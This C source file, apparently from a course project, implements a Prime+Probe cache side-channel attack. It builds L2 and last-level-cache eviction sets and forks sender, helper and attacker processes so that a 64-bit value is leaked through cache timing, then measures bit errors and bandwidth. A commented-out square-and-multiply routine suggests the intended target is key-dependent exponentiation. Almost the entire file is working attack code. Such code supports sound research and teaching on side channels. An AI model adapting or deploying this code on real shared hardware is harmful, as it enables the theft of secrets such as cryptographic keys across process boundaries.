// call as below:
// taskset -c 0,2,4,6 ./attack_PandP 

// #include "../inline_asm.h"
#include <assert.h>
#include <ctype.h>
#include <errno.h>
#include <inttypes.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <math.h>
// #include <x86intrin.h>
#include <stdbool.h>
// #include find_eviction_set.h
#include "cache/evset.h"
#include "build_ev.h"

#define CACHE_PAGE_SIZE 4096
#define CACHE_LINE_SIZE 64
#define NUM_PAGE_PER_ALLOC 5
#define SYMBOL_CNT (1 << (sizeof(char) * 8))

#define EPOCH_LENGTH 40000. 
#define WTD 11 
#define WL2 16
#define NUM_REPEATS 1
#define ENABLE_HELPERS 0 
#define ENABLE_TIMING_LOGS 0

// need to run a little to let them sync up
#define DUMMY_RUNS 30

// Message we want to send
// const uint64_t msg = 0x12345678910;
//const uint64_t msg = 3141592653589793238;
//uint64_t msg = ((uint64_t)rand() << 32) | rand(); 

// Code for the attack victim if not doing a side channel
/*
uint64_t sqr(uint64_t r){
	r = r * r ;
	return r;
}

uint64_t mod(uint64_t r, uint64_t m){
	r = r % m;
	return r;
}

uint64_t mul(uint64_t r, uint64_t b){
	r = r * b;
	return r;
}


// TODO CONFIRM THAT THIS IMPLEMENTATION OF SQUARE MULT WORKS
uint64_t square_multiply(uint64_t b, uint64_t m, uint64_t e, int n) {
	uint64_t r = 1; 
	for (int i = n - 1; i >= 0 ; i --){
		r = sqr(r);
		r = mod(r, m);
		if (e % 2 != 0){
			r = mul(r, b);
			r = mod(r, m);
		}
		e /= 2;
	}
	return r;
*/


// helper function for printing the results
void print_bin(uint64_t val){
	int num_bits = sizeof(uint64_t) * 8;
	for (int i = num_bits - 1; i >= 0; i--){
		printf("%lu", (val >> i) & 1);
	}
	printf("\n");
}

uint64_t count_mismatch(uint64_t xor_res){
	uint64_t count = 0;
	while (xor_res > 0){
		xor_res &=(xor_res-1);
		count ++;
	}
	return count;
}

// Busy wait until the timestamp counter passes a certain value
// There's no guarantee on how far we have gone passed the intended value
static inline void busy_wait_until(uint64_t until) {
    while (_rdtsc() < until) {
        __asm__ __volatile__("rep; nop" ::: "memory");
    }
}

uint64_t calibrate_latency(){
	// TODO IMPLEMENT CALIBRATING LATENCY
	uint64_t foo = 160;
	return foo;
}

uint64_t calibrate_l2_to_llc_latency(){
	// TODO IMPLEMENT CALIBRATING LATENCY
	uint64_t foo = 66;
	return foo;
}

void process_sender(uint64_t start_tsc, uint64_t msg_len, uint8_t *target_page, uint64_t msg, 
	bool enable_logging, double epoch_length) 
	{
	// Function pulled from the professor, for initial validation of attack
    uint64_t next_transmission = start_tsc + epoch_length / 2; // Send takes less time, alloted quarter epoch
    bool transmit = false;
    for (uint64_t i = 0; i < msg_len + DUMMY_RUNS; i++) {
		// Synchronize send for each epoch 
        busy_wait_until(next_transmission);
        next_transmission += epoch_length;

        // Sender transmits the information by
		// Conditionally accessing the target page 
		if (i >= DUMMY_RUNS) {
			transmit = msg & 1;
			msg = msg >> 1;
		}
        
        if (transmit){
        	_maccess(target_page);
        }

        // Print the epoch information
        uint64_t now = _rdtsc();
        uint64_t epoch_id = (now - start_tsc) / epoch_length;
        printf("EPOCH: %" PRIu64 "; Transmitting: '%d' \n", epoch_id, transmit);
    }
}

void process_receiver_helper(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd, uint8_t cnt, bool enable_logging, double epoch_length){
	// The helper threads continuously load pages in the EV so they are in shared, to control the replacement policy
	// stop the helper after a certain number of epochs
	if (ENABLE_HELPERS == 1) {
		//uint64_t end_tsc = start_tsc + (epoch_length * (msg_len + 1));
		//while (_rdtsc() < end_tsc){
		//	for (int i = 0; i < cnt-1; i++){
		//		_maccess(EVtd[i]);
		//	}
		//}
		// setup the timers for the side channel

		uint64_t next_prime = start_tsc;
		for (uint64_t i = 0; i < msg_len + DUMMY_RUNS; i++){
			busy_wait_until(next_prime);
			next_prime += epoch_length;
			for (int i = 0; i < cnt-1; i++){
				_maccess(EVtd[i]);
			}
		}


	}
}

uint64_t process_receiver(uint64_t start_tsc, uint64_t msg_len, uint8_t **EVtd, uint8_t **EVl2_mul, 
	uint8_t cnt_td, uint8_t cnt_l2, uint64_t threshold, 
	uint8_t *target_page, uint64_t msg,
	bool enable_logging, double epoch_length){

	// setup handling incoming data
	uint64_t recv_int = 0;
	uint64_t recv_mask = 1;

	// setup the timers for the side channel
	uint64_t next_prime = start_tsc; // Prime takes the longest time, allotted half of epoch
	uint64_t next_probe = start_tsc + 3. * epoch_length / 4.; // Probe takes less time, allotted quarter of epoch

	struct timespec start_stamp, end_stamp;

	//main receiver loop
	for (uint64_t i = 0; i < msg_len + DUMMY_RUNS; i++){
		// Synchronize receive for each epoch
		if (i == DUMMY_RUNS) {
			clock_gettime(CLOCK_MONOTONIC_RAW, &start_stamp);
		}

		busy_wait_until(next_prime);
		next_prime += epoch_length;
		
		// Prime
		// Access L2 EV set to 
		
		for (int j = 0 ; j < 6; j++){
			for (int ii = 0; ii < cnt_l2; ii ++){
				_maccess(EVl2_mul[ii]);
			}
		}
		

		for (int j = 0 ; j < 6; j++){
			for (int ii = 0; ii < cnt_td; ii ++){
				_maccess(EVtd[ii]);
			}
		}
	
		_lfence();

		// wait for side channel transmission 
		busy_wait_until(next_probe);
		next_probe += epoch_length;

		// Probe
		int ev_kicked_count = 0;
		
		// Time access for TD and L2 EV
		/*
		for (int ii = 0; ii < cnt_l2; ii ++) {
			uint64_t start = _timer_start();
			_maccess(EVl2_mul[ii]);
			uint64_t lat = _timer_end() - start;
			printf("EV L2 - Time Diff: %" PRIu64 " \n", lat);
		    if (lat > threshold) {
				ev_kicked_count++;
			}
		}
		*/
		
		
		// Static Threshold Method
		for (int ii = 0; ii < cnt_td; ii++) {
			uint64_t start = _timer_start();
			_maccess(EVtd[ii]);
			uint64_t lat = _timer_end() - start;
			//if (enable_logging == 1) {
			//	printf("EV TD - Time Diff: %" PRIu64 " \n", lat);
			//}
		    if (lat > threshold) {
				ev_kicked_count++;
			}
		}
		bool received_val = (ev_kicked_count > 0);
		
		_lfence();


		// Standard Deviation Detection Method
		/*
		uint64_t *times = malloc(cnt_td * sizeof(uint64_t));
		for (int ii = 0; ii < cnt_td; ii++) {
			uint64_t start = _timer_start();
			_maccess(EVtd[ii]);
			times[ii] = _timer_end() - start;
			printf("EV TD - Time Diff: %" PRIu64 " \n", times[ii]);
		    //if (lat > threshold) {
			//	ev_kicked_count++;
			//}
		}

    	// Compute mean
		double sum = 0.0;
		for (size_t ii = 0; ii < cnt_td; ii++) {
			sum += times[ii];
		}
		double mean = sum / cnt_td;


		// Compute standard deviation
		double variance = 0.0;
		for (size_t ii = 0; ii < cnt_td; ii++) {
			variance += (times[ii] - mean) * (times[ii] - mean);
		}
		variance /= cnt_td;
		double std_dev = sqrt(variance);

		// Identify outliers (greater than mean + k * std_dev)
		double k = 1.;
		double outlier_threshold = mean + k * std_dev;

		printf("Mean access time: %.2f cycles\n", mean);
		printf("Standard deviation: %.2f cycles\n", std_dev);
		printf("Outlier threshold: %.2f cycles\n", outlier_threshold);

		size_t outliers = 0;
		for (size_t ii = 0; ii < cnt_td; ii++) {
			if (times[ii] > outlier_threshold) {
				outliers++;
			}
		}

		printf("Found %zu outliers out of %d accesses.\n", outliers, cnt_td);

		bool received_val = (outliers > 0);
		*/
		/*
		uint64_t start = _timer_start();
		_maccess(target_page);
		uint64_t lat = _timer_end() - start;
		bool received_val = (lat > threshold);
		*/

		// Print the results
		uint64_t now = _rdtsc();
		uint64_t epoch_id = (now - start_tsc) / epoch_length;
		//printf("EPOCH: %" PRIu64 "; Receiving: '%d', latency: %lu, EV Kicked Count: %d \n", epoch_id, received_val, lat, ev_kicked_count);

		printf("EPOCH: %" PRIu64 "; Receiving: '%d', EV Kicked Count: %d \n", epoch_id, received_val, ev_kicked_count);

		// save results. Use mask to help
		if (i >= DUMMY_RUNS) {
			if (epoch_id < msg_len + DUMMY_RUNS){
				if (received_val){
					recv_int = recv_int | recv_mask;
				}
				recv_mask = recv_mask << 1;
			}
		}
	}
	
	clock_gettime(CLOCK_MONOTONIC_RAW, &end_stamp);
	uint64_t delta_ns = (end_stamp.tv_sec - start_stamp.tv_sec) * 1000000000 + (end_stamp.tv_nsec - start_stamp.tv_nsec);

	// print overall results
	printf("-----------------------------------------\n");
    printf("Expecting: ");
    print_bin(msg);
    printf("Received:  ");
    print_bin(recv_int);

	uint64_t difference = msg ^ recv_int;
	print_bin(difference);
	uint64_t num_mismatch = count_mismatch(difference);
	printf("mismatching bits: %lu\n", num_mismatch);
	uint64_t false_positives = ~msg & recv_int;
	uint64_t num_fp = count_mismatch(false_positives);
	printf("False Positives: %lu\n", num_fp);
	uint64_t false_negatives = msg & ~recv_int;
	uint64_t num_fn = count_mismatch(false_negatives);
	printf("False Negatives: %lu\n", num_fn);
	
	// Timing 
	printf("total attack time = %luns\n", delta_ns);
	uint64_t bandwidth = sizeof(msg) * 1000000000/ delta_ns;
	printf("bandwidth = %lu B/s\n", bandwidth);


	return num_mismatch;

}

uint64_t test_ev_set(uint8_t *target, uint8_t **EVl2_mul, uint8_t cnt_l2, uint8_t **EVtd, uint8_t cnt_td){
	printf("Testing eviction\n");

	double l2_lat = 0.;
	double llc_lat = 0.;
	
	for (int i =0; i < 5 ; i++){
		_maccess(target);
		uint64_t start = _timer_start();
		_maccess(target);
		uint64_t lat = _timer_end() - start;
		printf("Non evict latency: %lu\n", lat);
		l2_lat += lat;

		for (int j = 0 ; j < 6; j++){
			for (int m = 0; m < cnt_l2; m++){
				_maccess(EVl2_mul[m]);
			}
		}
		start = _timer_start();
		_maccess(target);
		lat = _timer_end() - start;
		printf("L2 evict latency: %lu\n", lat);
		llc_lat += lat;
		for (int j = 0 ; j < 6; j++){
			for (int m = 0; m < cnt_l2; m++){
				_maccess(EVl2_mul[m]);
			}
		}
		for (int j = 0 ; j < 6; j++){
			for (int m = 0; m < cnt_td; m++){
				_maccess(EVtd[m]);
			}
		}
		start = _timer_start();
		_maccess(target);
		lat = _timer_end() - start;
		printf("td evict latency: %lu\n", lat);
	}

	printf("L2 Lat Total: %f\n", l2_lat);
	printf("LLC Lat Total: %f\n", llc_lat);
	l2_lat /= 5.;
	llc_lat /= 5;
	printf("L2 Lat Avg: %f\n", l2_lat);
	printf("LLC Lat Avg: %f\n", llc_lat);
	return (l2_lat + llc_lat) / 2.;

}

int main(int argc, char *argv[]) {
    bool enable_logging = false;
    double epoch_length = EPOCH_LENGTH;

    for (int i = 1; i < argc; i++) {
        if ((strcmp(argv[i], "-enable_logging") == 0) || (strcmp(argv[i], "-l") == 0)) {
			enable_logging = true;
        } 
        else if ((strcmp(argv[i], "-epoch_length") == 0) || (strcmp(argv[i], "-e") == 0)) {
            if (i + 1 < argc) {
                epoch_length = atof(argv[i + 1]);
                i++;  // Skip value
            }
        }
        else {
            fprintf(stderr, "Unknown argument: %s\n", argv[i]);
            return 1;
        }
    }


	uint64_t msg = ((uint64_t)rand() << 32) | rand(); 

	int ret = 0;
	// make the memory regions take up multiple pages, so they should not co locate
	uint64_t total_mismatch = 0;
	
	uint8_t *target_page = mmap(NULL, CACHE_PAGE_SIZE * NUM_PAGE_PER_ALLOC, PROT_READ, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	if (cache_env_init(1)) {
		_error("Failed to initialize cache env!\n");
		return EXIT_FAILURE;
	}

	cache_oracle_init();
	
	// allcoate pointers for the eviction sets
	// EVSet *EVtd = NULL;
	// EVSet *EVl2_mul = NULL;


	// TODO NEED TO CALL evcands_new to generate canditates in the main function, so dont have pauge fault issues
	// ACTUALLY, CAN PASS IN AN EVBUFFER THERe
	// evbuffer_new
	// allocate the ev buffer
	// TODO FREE THIS MEMORY
	EVCandsConfig temp_evcands_config = {.scaling = 3, .filter_ev = NULL};
	EVBuffer *evb_td = evbuffer_new(detected_l3, &temp_evcands_config);
	EVCands *evcand_l2 = evcands_new(detected_l2, &((&def_l2_ev_config)->cands_config), NULL);
	evcands_populate(page_offset(target_page), evcand_l2, &((&def_l2_ev_config)->cands_config));


	uint8_t **EVtd = calloc(WTD + 1, sizeof(uint8_t *));
	uint8_t **EVl2_mul = calloc(WL2 + 1, sizeof(uint8_t *));
	uint8_t cnt_td = WTD;
	uint8_t cnt_l2 = WL2;

	// calibrate the latency
	//uint64_t threshold = calibrate_latency();
	//uint64_t threshold = calibrate_l2_to_llc_latency();

	// generate the eviction sets
	single_llc_evset(target_page, EVl2_mul, &cnt_l2, EVtd, &cnt_td, evb_td, evcand_l2);

	_clflush(target_page);
	flush_array(EVl2_mul, cnt_l2);
	flush_array(EVtd, cnt_td);
	_lfence();

	printf("cnt_td: %d\n", cnt_td);
	printf("cnt_l2: %d\n", cnt_l2);
	
	uint64_t threshold = test_ev_set(target_page, EVl2_mul, cnt_l2, EVtd, cnt_td);

	for (int i = 0; i < NUM_REPEATS; i ++ ){
		_lfence();
		// sizeof returns number of bytes in msg, so multiply by 8 to get the total number of bits
		uint64_t msg_len = sizeof(uint64_t) * 8;
		uint64_t start_tsc = (_rdtsc() / epoch_length + 10) * epoch_length;
		// process_receiver_helper(start_tsc, msg_len, EVtd);
		// process_receiver_helper(start_tsc, msg_len, EVtd, cnt_td);
		// printf("Done with helper\n");
		// process_receiver(start_tsc, msg_len, EVl2_mul, cnt_l2, threshold, target_page);
		// printf("done with attacker\n");
		
		pid_t pid = fork();
		if (pid == 0) {
			// Victim/ sender
			printf("Sender\n");
			process_sender(start_tsc, msg_len, target_page, msg, enable_logging, epoch_length);
			printf("Sender Done\n");

		}
		else if (pid > 0) {
			pid_t pid2 = fork();
			if (pid2 == 0) {
				// helper 0 
				printf("Helper 0\n");
				process_receiver_helper(start_tsc, msg_len, EVtd, cnt_td, enable_logging, epoch_length);
				printf("Helper 0 done\n");
			}
			else if (pid2 > 0) {
				pid_t pid3 = fork();
				if (pid3 == 0){
					// helper 1
					printf("Helper 1\n");
					process_receiver_helper(start_tsc, msg_len, EVtd, cnt_td, enable_logging, epoch_length);
					printf("Helper 1 done\n");
				}
				else if (pid3 > 0) {
					// primary process is attacker
					printf("Attacker\n");
					total_mismatch += process_receiver(start_tsc, msg_len, EVtd, EVl2_mul, cnt_td, cnt_l2, threshold, target_page, msg, enable_logging, epoch_length);
					wait(NULL); //wait for child process
				}
				else {
					perror("fork");
					ret = errno;
					goto cleanup;
				}	
				wait(NULL); //wait for child process
			}
			else {
				perror("fork");
				ret = errno;
				goto cleanup;
			}
			wait(NULL); //wait for child process
		}
		else {
			perror("fork");
			ret = errno;
			goto cleanup;
		}
	}
	cleanup:
		munmap(target_page, CACHE_PAGE_SIZE * NUM_PAGE_PER_ALLOC);

	return ret;
}

